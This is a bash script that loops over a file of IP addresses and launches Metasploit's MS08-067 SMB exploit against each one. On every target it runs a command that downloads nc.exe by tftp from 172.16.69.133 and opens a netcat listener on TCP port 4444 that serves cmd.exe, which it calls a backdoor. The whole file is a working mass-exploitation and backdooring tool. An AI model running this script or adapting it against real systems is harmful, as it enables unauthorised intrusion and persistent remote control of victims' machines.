#!/bin/bash

if [ ! $1 ]; then echo "Usage: #./script <host file>"; exit; fi

iplist=$1

i=4444
for ip in $(cat $iplist)
do
gnome-terminal -x msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set PAYLOAD windows/exec; set RHOST $ip; set CMD cmd.exe /c tftp -i 172.16.69.133 GET nc.exe && nc.exe -lvp 4444 -e cmd.exe; run"

echo "Exploiting $ip and creating backdoor on TCP port 4444"
i=$(($i+1))
done


